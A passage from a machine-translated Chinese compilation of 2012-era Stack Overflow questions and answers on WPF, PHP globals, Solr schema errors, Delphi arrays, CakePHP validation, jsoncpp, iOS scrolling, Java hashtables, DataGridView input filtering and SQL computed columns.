   public ICommand QuitCommand { get { /* ommitted */ } }
   public object CurrentStep { get; set; }//raise OnPropertyChanged("CurrentStep"); in your setter!!
}

public class WizardStep1Vm {
   public string StepName { get; set; }
   public string StepText {get; set; }
}

public class WizardStep2Vm {
   public string StepName { get; set; }
   public string StepText {get; set; }
} 
```

窗口.xaml

```
<Window>
<Window.Resources>
    <DataTemplate DataType="{x:Type local:WizardStep1Vm}">
        <!--your view for step1 goes here-->
        <local:MyStep1View/>
    </DataTemplate>
    <DataTemplate DataType="{x:Type local:WizardStep2Vm}">
        <!--your view for step2 goes here-->
        <local:MyStep2View/>
    </DataTemplate>
</Window.Resources>
  <Grid>
    <Grid.RowDefinitions>
        <RowDefinition />
        <RowDefinition />
    </Grid.RowDefinitions>

    <TextBlock Grid.Row="0" Text="{Binding Name}" />

    <ContentPresenter Content="{Binding CurrentStep}"/>

  </Grid>
</Window> 
```

每当您在视图模型中设置 CurrentStep 属性时。您将在您的内容控件中看到正确的视图。如果没有，则缺少 DataTemplate ;)

# google-docs-api - 文档资源更改时更新回调？

> ID：11309484
> 
> 赞同：0
> 
> 时间：2012-07-03T10:58:52.307
> 
> 标签：google-docs-api, google-drive-api

我正在使用谷歌文档 API。我如何知道文件资源何时更改？

我不想重复轮询数据。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-14T12:00:16.777

恐怕你不能接到回电。但是，为避免轮询文件数据，您可以仅轮询元数据并测试 md5 校验和字段以确定文件何时更改。

md5 校验和字段位于文件的文档列表条目中的`docs$md5Checksum`(JSON) 或(XML) 中。`docs:md5Checksum`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-10T15:01:41.357

首先，您应该使用[Google Drive API](https://developers.google.com/drive)，它已经取代了 Google Documents List API。

目前，没有通知系统，但这是我们正在开发的一项功能。每隔几分钟轮询一次更改提要并不算太糟糕，但在某些情况下确实不太好。

# android - 即使设置了字符集，Android 浏览器也不接受输入文本中的字符

> ID：11309486
> 
> 赞同：0
> 
> 时间：2012-07-03T10:58:57.167
> 
> 标签：android, html, character-encoding

我有一个网页，将元字​​符集指定为 iso-8859-1，并且在输入文本的形式中也将接受字符集指定为相同。在每个字母上都会触发一个 ajax 请求，它在除 androids 浏览器之外的所有浏览器中都能正常工作。它只是没有在 iso-8859-1 中输入任何特殊字母，例如 åäö。这是什么原因？

# php - PHP 变量跨越 require_once 和函数

> ID：11309493
> 
> 赞同：0
> 
> 时间：2012-07-03T10:59:39.420
> 
> 标签：php, variables, global-variables

我有 2 个 php 文件。

索引.php：

```
<?php
    $counter = 0;
    require_once('temp.php');
    temp();
    echo $counter;
?> 
```

临时文件：

```
<?php
    function temp() {
            tempHelper();
    }
    function tempHelper() {
            $counter++;
    }
?> 
```

我想打印 1 而不是 0。我试图将 $counter 设置为全局变量但没有成功。

我能做些什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T11:01:51.090

您的`tempHelper`函数正在增加一个局部`$counter`变量，而不是全局变量。您必须通过两个函数通过引用传递变量，或者使用全局变量：

```
function tempHelper() {
  global $counter;
  $counter++;
} 
```

请注意，对全局变量的依赖可能表明您的应用程序存在设计缺陷。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T11:04:22.687

我建议不要使用全局变量。为你的计数器使用一个类可能会更好。

```
class Counter {
    public $counter;

    public function __construct($initial=0) {
        $this->counter = $initial;
    }

    public function increment() {
        $this->counter++;
    }

} 
```

* * *

或者只使用没有函数的变量。`$counter++`您的函数似乎是多余的，因为它与函数名称一样容易键入。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T11:09:12.967

我想这应该有效：

```
<?php
    $counter = 0;

    function temp() {
            // global $counter; [edited, no need for that line]
            tempHelper();
    }
    function tempHelper() {
            global $counter;
            $counter++;
    }

    temp();
    echo $counter;
?> 
```

或者您可以将变量作为参数传递或从该函数返回新值。

更多信息请访问[http://www.simplemachines.org/community/index.php?topic=1602.0](http://www.simplemachines.org/community/index.php?topic=1602.0)

# java - Solr“未定义的字段文本”

> ID：11309494
> 
> 赞同：15
> 
> 时间：2012-07-03T10:59:40.207
> 
> 标签：java, tomcat, solr

我最近将我的 solr 实例从 1,4 升级到了 3.6。但是，现在每当我更新索引时，我的日志中似乎都会收到“未定义的字段文本”严重消息。

我的架构中确实有文本字段（自 1.4 版起有效），但以前从未必须将其声明为字段类型。这在 3.6 中有变化吗？

我的架构在这里 >> [http://pastebin.com/KrCVab0U](http://pastebin.com/KrCVab0U)

```
SEVERE: org.apache.solr.common.SolrException: undefined field text
        at org.apache.solr.schema.IndexSchema.getDynamicFieldType(IndexSchema.java:1330)
        at org.apache.solr.schema.IndexSchema$SolrQueryAnalyzer.getAnalyzer(IndexSchema.java:408)
        at org.apache.solr.schema.IndexSchema$SolrIndexAnalyzer.reusableTokenStream(IndexSchema.java:383)
        at org.apache.lucene.queryParser.QueryParser.getFieldQuery(QueryParser.java:574)
        at org.apache.solr.search.SolrQueryParser.getFieldQuery(SolrQueryParser.java:206)
        at org.apache.lucene.queryParser.QueryParser.Term(QueryParser.java:1429)
        at org.apache.lucene.queryParser.QueryParser.Clause(QueryParser.java:1317)
        at org.apache.lucene.queryParser.QueryParser.Query(QueryParser.java:1245)
        at org.apache.lucene.queryParser.QueryParser.TopLevelQuery(QueryParser.java:1234)
        at org.apache.lucene.queryParser.QueryParser.parse(QueryParser.java:206)
        at org.apache.solr.search.LuceneQParser.parse(LuceneQParserPlugin.java:79)
        at org.apache.solr.search.QParser.getQuery(QParser.java:143)
        at org.apache.solr.handler.component.QueryComponent.prepare(QueryComponent.java:105)
        at org.apache.solr.handler.component.SearchHandler.handleRequestBody(SearchHandler.java:165)
        at org.apache.solr.handler.RequestHandlerBase.handleRequest(RequestHandlerBase.java:129)
        at org.apache.solr.core.SolrCore.execute(SolrCore.java:1376)
        at org.apache.solr.handler.PingRequestHandler.handleRequestBody(PingRequestHandler.java:67)
        at org.apache.solr.handler.RequestHandlerBase.handleRequest(RequestHandlerBase.java:129)
        at org.apache.solr.core.SolrCore.execute(SolrCore.java:1376)
        at org.apache.solr.servlet.SolrDispatchFilter.execute(SolrDispatchFilter.java:365)
        at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:260)
        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)
        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
        at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:233)
        at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:191)
        at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:127)
        at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:102)
        at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109)
        at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:293)
        at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:859)
        at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:602)
        at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:489)
        at java.lang.Thread.run(Thread.java:679) 
```

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-07-03T11:37:15.627

这与字段类型“文本”无关。它是关于名为“文本”的字段。

您已将配置中的默认字段更改为“search_text”。请尝试将所有对“search_text”的引用重命名为“text”。如果这解决了问题，那么您知道配置中的某处您指的是“文本”字段，可能在 solrconfig.xml 中，如[Solr Query - HTTP error 404 undefined field text中所建议的那样](https://stackoverflow.com/questions/10130163/solr-query-http-error-404-undefined-field-text/10130462#10130462)

希望能帮助到你。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-03-06T06:34:57.740

我在我的 solrconfig.xml 文件中有这个。

```
<requestHandler name="/admin/ping" class="solr.PingRequestHandler">
 <lst name="invariants">
  <str name="q">solrpingquery</str>
 </lst>
 <lst name="defaults">      
  <str name="echoParams">all</str>
  </lst>
</requestHandler> 
```

如果您尚未在 schema.xml 中添加它，请添加它

```
<field name="text" type="text_general" indexed="true" stored="false" multiValued="true"/> 
```

这将解决您的问题。

谢谢

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-03-21T00:13:55.997

我今天也发生了。如果您在发生错误时进行查询，那么您需要在查询中使用双引号，如下所示：

文件路径：“要查询的数据”

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2014-12-13T14:23:36.183

在 solr 管理界面中，您可以看到当前工作的方案，然后您可以确定您是否走在正确的道路上。下面的图片说明了

4.10.2及更高版本（假设）

![solr.4.10.2](../Images/71f565cb864ce3bc34ac1f62a55f56ea.png)

低于 4.10.2 的版本。您应该使用左侧**方案**菜单。

![solr.4.10.2](../Images/cb478144467dfb2d00b0bc0d7cf52cb3.png)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2014-08-19T15:14:45.143

当我清理`fq`查询的一部分时，我遇到了同样的错误。消毒后，solr 收到

```
...&fq=type\:Product&... 
```

虽然我有字段命名`type`，但错误是“未定义的字段文本”。

当我删除清理时，查询正常：

```
...&fq=type:Product&... 
```

令人困惑的错误消息的原因在 solrconfig.xml 中：

```
<requestHandler name="/select" class="solr.SearchHandler">
  <lst name="defaults">
    <str name="echoParams">explicit</str>
    <int name="rows">10</int>
    <str name="df">text</str>
  </lst>
</requestHandler> 
```

# arrays - 将变体数组转换为动态数组

> ID：11309495
> 
> 赞同：1
> 
> 时间：2012-07-03T10:59:40.443
> 
> 标签：arrays, delphi

我正在尝试将变体数组（双精度数，但我猜它可能是任何东西）转换为动态数组。我通常使用 DynArrayFromVariant 和 DynArrayToVariant 过程，但在这种情况下，我的变量数组是基于 1 的。这两个函数似乎只适用于基于 0 的数组。知道我该怎么做我需要做的吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-03T11:49:12.367

如果您知道数组元素的类型，您可以编写更高效（但不那么通用）的代码：

```
function DoubleDynArrayFromVarArray(const V: Variant): TDoubleDynArray;
var
  P: Pointer;
  Count: Integer;
begin
  Result := nil;
  if not VarIsArray(V) or (VarType(V) and varTypeMask <> varDouble) or
    (VarArrayDimCount(V) <> 1) then
    raise EVariantInvalidArgError.Create(SVarInvalid);

  Count := VarArrayHighBound(V, 1) - VarArrayLowBound(V, 1) + 1;
  if Count = 0 then
    Exit;

  P := VarArrayLock(V);
  try
    SetLength(Result, Count);
    Move(P^, Result[0], Count * SizeOf(Double));
  finally
    VarArrayUnlock(V);
  end;
end; 
```

# validation - Cakephp：根据从下拉列表中选择的选项验证输入字段

> ID：11309498
> 
> 赞同：0
> 
> 时间：2012-07-03T10:59:43.273
> 
> 标签：validation, cakephp, cakephp-2.1, cakephp-model

大家好，我的代码需要帮助，我不知道该怎么做。我有一个表格，学生选择考试机构，如果选择的考试机构是 zimsec 分数应该是空的，如果考试机构是剑桥分数不应该是空的，应该根据成绩取一个范围。validMarks 是我用来验证标记的函数，当我允许标记为空以适应 Zimsec 时，它停止工作。

我的 add.ctp

```
echo "<td>"; 
echo $this->Form->label('Mark(%): ');
echo "</td><td>";   
echo $this->Form->input("ApplicantOlevelQualification.mark.$s",array('label'=>''));
echo "</td></tr>";
echo $this->Form->label('Exam Body<font color=red>*</font>');
$exambody=array(
    'ZIMSEC'=>'ZIMSEC',
    'CAMBRIDGE'=>'CAMBRIDGE'
);
echo $this->Form->select('exam_body_code',$exambody,array('empty'=>'Please Select','selected'=>false,'label'=>'Exam Body<font color="red">*</font>')); 
```

我的控制器

```
$exam_body_code = $this->data['ApplicantOlevelQualification']['exam_body_code'];
'mark' => $this->data['ApplicantOlevelQualification']['mark'][$i], 
```

我的模型

```
'exam_body_code' => array(
    'notempty' => array(
        'rule' => array('notempty'),
    ),
),
'mark' => array(
    //'numeric' => array(
    //'rule' => array('numeric'),
    'rule' => array('validMarks'),
        'message' => 'Wrong mark for this grade, please try again.',
        'allowEmpty' => true,
    //  ),
),

public function validMarks($check) {
    $grade=($this->data['ApplicantOlevelQualification']['grade']);
    $mark=($this->data['ApplicantOlevelQualification']['mark']);
    //var_dump($mark);
    if($grade== 'A' && $mark>74) {
        // $this->validationError( 'grade', 'Grade A must be greater than or equal to 75%' );
        //Access $this->data and $check to compare your marks and grade;
        return true;
    } elseif( ($grade)== 'B' && ($mark>64)) {
        return true;   
    } elseif( ($grade)== 'C' && ($mark)>50) {
        return true;   
    } elseif( ($grade)== 'D' && ($mark)>40) {
        return true;   
    } elseif( ($grade)== 'E' && ($mark)>30) {
        return true;   
    } elseif( ($grade)== 'U' && ($mark)>0) {
        return true;   
    } else {
        return false;
    }

    //Access $this->data and $check to compare your marks and grade..
 } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T13:04:49.463

> 如果选择的考试主体是 zimsec 标记应该是空的，如果考试主体是剑桥标记不应该是空的并且应该采取一个范围......

在这种情况下，您应该将验证拆分为 2 个函数：

```
function emptyIfZimsec($data) {
    return $this->data['ApplicantOlevelQualification']['exam_body_code'] != 'ZIMSEC'
        || empty($this->data['ApplicantOlevelQualification']['mark']);
}

function validMarks($data) {
    if ($this->data['ApplicantOlevelQualification']['exam_body_code'] != 'CAMBRIDGE')
        return true;

    ... 
```

`emptyIfZimsec`如果代码是 ZIMSEC 并且标记不为空，将导致验证错误。并且`validMarks`会检查 CAMBRIDGE 标记（如果 ZIMSEC 则跳过）

这样，您还可以为每种情况输出单独的验证错误消息。

希望这可以帮助。

# c++ - 使用 jsoncpp 的 StyledWriter 在一行中写入一个大数组

> ID：11309502
> 
> 赞同：0
> 
> 时间：2012-07-03T10:59:57.347
> 
> 标签：c++, json, jsoncpp

我正在使用[jsoncpp](http://jsoncpp.sourceforge.net/)来读取和写入 json 文件。

对于写作，我使用 StyledWriter，它以人类可读的方式编写 json。

目前，我正在尝试将整数数组写入 json 文件。该文档描述了写入数组值的以下规则：

> *   如果为空则打印 [] 没有缩进和换行
> *   如果数组不包含对象值、空数组或其他一些值类型，并且所有值都适合一行，则将数组打印在一行上。
> *   否则，如果值不适合一行，或者数组包含对象或非空数组，则每行打印一个值。

由于我要写的数组对于一行来说太大了，根据上面的规则，作者每行打印一个值，这使得我的 json 丑陋且可读性降低。我希望将整个数组写在一行或多行中，每行有几个值。

我知道 jasoncpp 是开源的，因此我可以改变作者来做我想做的事，但我想知道是否有不同的方法可以做到这一点。也许同时使用 FastWriter（它创建一个单行 json）和 StyledWriter？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-09-20T07:27:22.513

您应该按如下方式使用 FastWriter：

```
Json::Value your_json(Json::objectValue);
//init your json...
Json::FastWriter fastWriter;
fastWriter.write(your_json) 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-06-07T08:20:55.557

查看 json_writer.cpp - 两个 writeIndent() 方法。

```
void 
StyledStreamWriter::writeIndent()
{
  /*
    Some comments in this method would have been nice. ;-)

   if ( !document_.empty() )
   {
      char last = document_[document_.length()-1];
      if ( last == ' ' )     // already indented
         return;
      if ( last != '\n' )    // Comments may add new-line
         *document_ << '\n';
   }
  */
//Removing indent and line feed!!!   *document_ << '\n' << indentString_;
}

void 
StyledWriter::writeIndent()
{
   if ( !document_.empty() )
   {
      char last = document_[document_.length()-1];
      if ( last == ' ' )     // already indented
         return;
//Removing indent and line feed!!!      if ( last != '\n' )    // Comments may add new-line
//Removing indent and line feed!!!         document_ += '\n';
   }
   document_ += indentString_;
} 
```

# iphone - 基于 UIScrollView 中的滚动来旋转滚轮

> ID：11309503
> 
> 赞同：3
> 
> 时间：2012-07-03T10:59:58.600
> 
> 标签：iphone, objective-c, ios, xcode, uiscrollview

我正在尝试根据 UIScrollView 的滚动使轮子平滑旋转。当它几乎停止滚动滚动视图时，我希望它能够缓解。

我尝试了很多但到目前为止失败了，我当前的代码是这样的：

```
#pragma mark - Scrollview delegate

- (void)scrollViewDidScroll:(UIScrollView *)scrollView {
    CGFloat pageWidth = scrollView.frame.size.width;
    int page = floor((scrollView.contentOffset.x - pageWidth / 2) / pageWidth) + 1;
    NSLog(@"Offset: %@ Page: %i", NSStringFromCGPoint(scrollView.contentOffset), page);

    UIImageView* leftWheelImageView = (UIImageView*)[self.carImageView viewWithTag:10];

    // Calculate speed of scrolling and turn the wheels to it
    CGPoint currentOffset = scrollView.contentOffset;
    NSTimeInterval currentTime = [NSDate timeIntervalSinceReferenceDate];

    if(lastTime - currentTime > 0.1) {
        CGFloat distance = currentOffset.x - lastOffset.x;
        CGFloat scrollSpeedNotAbs = (distance * 10) / 1000; //in pixels per millisecond        
        CGFloat scrollSpeed = fabsf(scrollSpeedNotAbs);

        leftWheelImageView.transform = CGAffineTransformMakeRotation(DEGREES_TO_RADIANS(2*3.14*99));
        NSLog(@"Rotate wheel");
    }

    lastOffset = currentOffset;
    lastTime = currentTime;
} 
```

谁能把我推向正确的方向:-)？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-03T12:25:47.007

您设置的偏移量和时间不正确；照原样，并且`lastOffset`每次收到 didScroll 消息时都会`lastTime`更改为。因此，只有在每条消息之间的间隔超过 0.1 秒时才会触发您的 if 语句。既然您说您希望滚动流畅，那么这似乎不太可能是您想要的。也许将您的作业移到您的 if 语句中？我看看能不能找到另一种方法供你使用。`currentOffset``currentTime`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-14T11:13:13.017

Why don't you use the library for doing this ? I have done this using carousel library . Please refer following link [https://github.com/nicklockwood/iCarousel](https://github.com/nicklockwood/iCarousel) this is easy and better to implement.

# java - 具有冲突解决方案的 java 哈希表

> ID：11309506
> 
> 赞同：1
> 
> 时间：2012-07-03T11:00:06.057
> 
> 标签：java

我想获取特定键的所有值（多个）。但我只得到一个值？我不知道如何打印所有值。如果有人更正代码，会有很大的帮助..没有从谷歌搜索中获得任何帮助。 .

```
import java.util.*;

public class hashing
{
  public static void main(String args[])
  {
       String[] ary=new String[4];
       String key;
       char[] chrary;
       ary[0]=new String("abcdef");
       ary[1]=new String("defabc");
       ary[2]=new String("ghijkl");
       ary[3]=new String("jklghi");
       Hashtable<String, String> hasht = new Hashtable<String, String>(); 
       for(int i=0;i<4;i++){
          chrary=ary[i].toCharArray();
          Arrays.sort(chrary);
          key=new String(chrary);
          hasht.put(key,ary[i]);
       }
       Enumeration iterator = hasht.elements();
    while(iterator.hasMoreElements()) {
      String temp = (String)iterator.nextElement();
      System.out.println(temp);
    }

 }
} 
```

**PS：输出是defabc jklghi。我想要abcdef defabc ghijkl jklghi。**

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-03T11:03:00.743

哈希表每个键只能包含*一个*值。要存储多个值，您应该

1.  每个键存储一个集合（例如`List<String>`或数组）。请注意，您必须在插入与该键对应的第一个值之前初始化集合
2.  使用[多图](http://docs.guava-libraries.googlecode.com/git-history/v12.0/javadoc/com/google/common/collect/Multimap.html?is-external=true)

请注意，存在许多 MultiMap 实现。Oracle 文档也提供了一个简单的实现（参见[此处](http://docs.oracle.com/javase/tutorial/collections/interfaces/map.html)，并搜索*MultiMap*）

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-03T11:02:16.327

HashMap 的工作方式是给定键只有一个值。所以如果你打电话：

```
map.put(key, value1);
map.put(key, value2); 
```

第二行将覆盖键对应的值。

关于您对碰撞的评论，它意味着不同的东西。在内部，HashMap 将键/值对存储在基于键的哈希码定义的桶中（因此名称为：hashmap）。在两个不相等的键具有相同的哈希码的情况下（如果哈希码函数良好，则概率很低），实现需要确保在其中一个键上查询哈希图将返回正确的值。这就是需要处理哈希冲突的地方。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-03T11:04:09.207

这不是冲突解决的目的。冲突解决可让您处理具有*不同*键的两个对象将进入哈希映射中的相同“桶”的情况。这个解决方案是如何发生的是哈希映射实现的内部细节，而不是暴露给你的东西。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-03T11:23:06.367

实际上，在您的情况下，它不是冲突，而是具有相同哈希码的相同键。通常，只有当两个**不同的键生成相同的 hashcode**时才会发生冲突，这可能是由于`hashCode()`方法的错误实现而发生的。

是的，`java.util.HashMap`将处理哈希冲突，如果您查看 的源代码`HashMap`，它将每个值存储在`LinkedList`. 这意味着，如果两个具有相同哈希码的不同键进入......那么这两个值将进入同一个桶，但作为`linked list`.

在网上找到了这个[链接](http://javarevisited.blogspot.in/2011/02/how-hashmap-works-in-java.html)，它详细解释了哈希映射是如何工作的。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-03T11:02:17.230

如果 key 相同，则更新 value。jvm 不会为相同的键放置新的键/值...

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-07-03T11:02:31.317

您`Hashtable<String, String>`将一个字符串映射到一个字符串。因此`put`替换之前链接到特定键的值。

如果你想要多个值，你可以制作 a`Hashtable<String, []String>`或 a `Hashtable<String, List<String>>`。

更简洁的解决方案是使用 Google 的[Multimap](http://google-collections.googlecode.com/svn/trunk/javadoc/com/google/common/collect/Multimap.html)，它允许将多个值关联到一个键：

> 类似于 Map 的集合，但可以将多个值与单个键相关联。如果您使用相同的键但值不同的两次调用 put(K, V)，则多重映射包含从键到两个值的映射。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-07-03T11:03:13.063

您只为每个键放置一个字符串：

```
hasht.put(key,ary[i]); 
```

因此，如果 i=1 这意味着您 put `defabc`，为什么您期望为同一个键获得多个值？

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-07-03T11:04:47.180

Hashtable，像所有 Map 一样，每个键只保留一个值，即您设置的最后一个值。

如果要保留所有值，只需打印原始数组。

```
String[] ary = "abcdef,defabc,ghijkl,jklghi".split(",");
System.out.println(Arrays.toString(ary)); 
```

印刷

```
[abcdef, defabc, ghijkl, jklghi] 
```

# c# - C#：如何验证 datagridview 单元格？

> ID：11309520
> 
> 赞同：0
> 
> 时间：2012-07-03T11:01:00.180
> 
> 标签：c#, winforms, datagridview

我有一个datagridview，我想只允许用户输入数字。但是如果用户输入错误的字母，那么我会显示错误消息。但问题是在我点击消息框上的“确定”按钮之后，我想清除那个特定的单元格值并允许用户输入另一个值。我该怎么做？

我应该使用哪个事件或函数。

提前致谢....

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:07:39.847

获取行索引，并从行索引中获取单元格索引。像这样你可以改变价值

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-01T10:08:23.803

只是一个想法，我知道这是一个老问题，但我所做的是首先将单元格限制为仅接受数字。为此，我重写了 ProcessCmdKey 方法。这是我使用的一些代码，它应该适合您，不要忘记将网格名称从 dgListData 更改为您的网格名称：

```
 /// <summary>
    /// The purpose of this method is two fold.  First it stops the data grid
    /// from adding a new row when the enter key is pressed during editing a cell
    /// Secondly it filters the keys for numeric characters only when the selected 
    /// cell type is of a numeric type.
    /// </summary>
    /// <param name="msg"></param>
    /// <param name="keyData"></param>
    /// <returns></returns>
    protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
    {
        //Let's get fancy and detect the column type and then filter the keys as needed.
        if (!dgListData.IsCurrentCellInEditMode) return base.ProcessCmdKey(ref msg, keyData); //only go into the routine if we are in edit mode

        if (helper.IsNumericType(dgListData.CurrentCell.ValueType))
        {
            if (helper.NumericFilterKeyData(keyData)) return true; //override the key
        }

        // Check if Enter is pressed
        if (keyData != Keys.Enter) return base.ProcessCmdKey(ref msg, keyData);
        // If there isn't any selected row, do nothing

        SetFocusToNextVisibleColumn(dgListData);
        return true;
    }

    private void SetFocusToNextVisibleColumn(DataGridView dgViewTarget)
    {
        if (dgViewTarget.CurrentCell == null) return;

        Console.WriteLine(dgViewTarget.CurrentCell.Value);

        if (dgViewTarget.CurrentCell.IsInEditMode) dgViewTarget.EndEdit();

        var currentColumn = dgViewTarget.CurrentCell.ColumnIndex;
        if (currentColumn < dgViewTarget.ColumnCount) ++currentColumn;
        for (var i = currentColumn; i < dgViewTarget.ColumnCount; i++)
        {
            if (!dgViewTarget[i, dgViewTarget.CurrentRow.Index].Displayed) continue;
            dgViewTarget.CurrentCell = dgViewTarget[i, dgViewTarget.CurrentRow.Index];
            break;
        }
    } 
```

我还有一个静态帮助程序类，我在整个项目中都使用它，这是您需要的两个例程。只需添加一个新的 helper.cs 类并将此代码粘贴到其中。

```
public static class helper
{
    private static readonly KeysConverter Kc = new KeysConverter();

    /// <summary>
    /// Filters the keys for numeric entry keys
    /// </summary>
    /// <param name="keyData"></param>
    /// <returns></returns>
    public static bool NumericFilterKeyData(Keys keyData)
    {
        var keyChar = Kc.ConvertToString(keyData);
        return !char.IsDigit(keyChar[0])
               && keyData != Keys.Decimal
               && keyData != Keys.Delete
               && keyData != Keys.Tab
               && keyData != Keys.Back
               && keyData != Keys.Enter
               && keyData != Keys.OemPeriod
               && keyData != Keys.NumPad0
               && keyData != Keys.NumPad1
               && keyData != Keys.NumPad2
               && keyData != Keys.NumPad3
               && keyData != Keys.NumPad4
               && keyData != Keys.NumPad5
               && keyData != Keys.NumPad6
               && keyData != Keys.NumPad7
               && keyData != Keys.NumPad8
               && keyData != Keys.NumPad9;
    }

    /// <summary>
    /// Determines if a type is numeric.  Nullable numeric types are considered numeric.
    /// </summary>
    /// <remarks>
    /// Boolean is not considered numeric.
    /// </remarks>
    public static bool IsNumericType(Type type)
    {
        if (type == null)
        {
            return false;
        }

        switch (Type.GetTypeCode(type))
        {
            case TypeCode.Byte:
            case TypeCode.Decimal:
            case TypeCode.Double:
            case TypeCode.Int16:
            case TypeCode.Int32:
            case TypeCode.Int64:
            case TypeCode.SByte:
            case TypeCode.Single:
            case TypeCode.UInt16:
            case TypeCode.UInt32:
            case TypeCode.UInt64:
                return true;
            case TypeCode.Object:
                if (type.IsGenericType && type.GetGenericTypeDefinition() == typeof(Nullable<>))
                {
                    return IsNumericType(Nullable.GetUnderlyingType(type));
                }
                return false;
        }
        return false;
    }

    /// <summary>
    /// Tests if the Object is of a numeric type This is different than testing for NumericType
    /// as this expects an object that contains an expression like a sting "123"
    /// </summary>
    /// <param name="expression">Object to test</param>
    /// <returns>true if it is numeric</returns>
    public static bool IsNumeric(Object expression)
    {
        if (expression == null || expression is DateTime)
            return false;

        if (expression is Int16 || expression is Int32 || expression is Int64 || expression is Decimal ||
            expression is Single || expression is Double || expression is Boolean)
            return true;

        try
        {
            if (expression is string)
            {
                if (
                    expression.ToString()
                        .IndexOfAny(
                            @" abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOOPQRSTUVWXYZ!@#$%^&*?<>[]|+-*/\'`~_"
                                .ToCharArray()) != -1) return false;
            }
            else
            {
                Double.Parse(expression.ToString());
            }
            return true;
        }
        catch
        {
        } // just dismiss errors but return false
        return false;
    }
} 
```

我希望这对您将来有所帮助

# sql - 在持久化字段中，如何返回不同表列中列的出现次数

> ID：11309521
> 
> 赞同：0
> 
> 时间：2012-07-03T11:01:00.817
> 
> 标签：sql, sql-server, persisted-column

由于第 3 方在 Web 应用程序中输入了记录，因此需要以下内容。

某些列（例如`Category`）需要验证，包括以下列。我有一个`OtherTable`包含允许值的表。

我需要确定当前表的列值在不同表的指定列中有多少次出现（即：IF）。如果没有发生，则导致标记错误“1”，如果发生，则不会导致标记错误“0”。

```
If `Category` can be found in `OtherTable.ColumnA` then return 0 else 1 
```

请问我该怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T11:14:17.473

> 如果`Category`可以找到`OtherTable.ColumnA`则返回0 else 1

你可以[`CASE`](http://msdn.microsoft.com/en-us/library/ms181765%28v=sql.105%29.aspx)使用[`EXISTS`](http://msdn.microsoft.com/en-us/library/ms188336.aspx)

```
SELECT CASE WHEN EXISTS(
   SELECT NULL 
   FROM AllowedValues av
   WHERE av.ColumnA = Category
) THEN 0 ELSE 1 END AS ErrorCode
, Category
FROM [Table] 
```

编辑：这是一个 sql-fiddle：[http ://sqlfiddle.com/#!3/55a2e/1](http://sqlfiddle.com/#!3/55a2e/1)

* * *

**编辑**：我刚刚注意到您想使用**计算列**。正如我所读到的，您只能将它与标量值一起使用，而不能与子查询一起使用。但是您可以创建一个[标量值函数](http://msdn.microsoft.com/en-us/library/ms131043%28v=sql.105%29.aspx)。

例如：

```
create table AllowedValues(ColumnA varchar(1));
insert into  AllowedValues Values('A');
insert into  AllowedValues Values('B');
insert into  AllowedValues Values('C');

create table [Table](Category varchar(1));
insert into  [Table]  Values('A');
insert into  [Table]  Values('B');
insert into  [Table]  Values('C');
insert into  [Table]  Values('D');
insert into  [Table]  Values('E');

-- create a scalar valued function to return your error-code
CREATE FUNCTION udf_Category_ErrorCode
(
    @category VARCHAR(1)
)
RETURNS INT

AS BEGIN
    DECLARE @retValue INT

    SELECT @retValue = 
      CASE WHEN EXISTS(
       SELECT NULL 
       FROM AllowedValues av
       WHERE av.ColumnA = @category
    ) THEN 0 ELSE 1 END

    RETURN @retValue
END
GO 
```

现在您可以将该列添加为使用该函数计算值的计算列：

```
ALTER TABLE [Table] ADD ErrorCode AS ( dbo.udf_Category_ErrorCode(Category) )
GO 
```

这是正在运行的 SQL：[http ://sqlfiddle.com/#!3/fc49e/2](http://sqlfiddle.com/#!3/fc49e/2)

**注意：正如@Damien_The_Unbelieve 在另一个答案中所评论的那样，即使您使用 UDF 保留结果，如果***OtherTable*中的行发生更改，该值也不会更新。请记住这一点，因此如果需要，您需要在 UDF 的帮助下手动更新表。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T11:34:08.140

```
select mt.*,IFNULL(cat_count.ct,0) as Occurrences from MainTable mt 
left outer join (select ColumnA,count(*) as ct from OtherTable) cat_count 
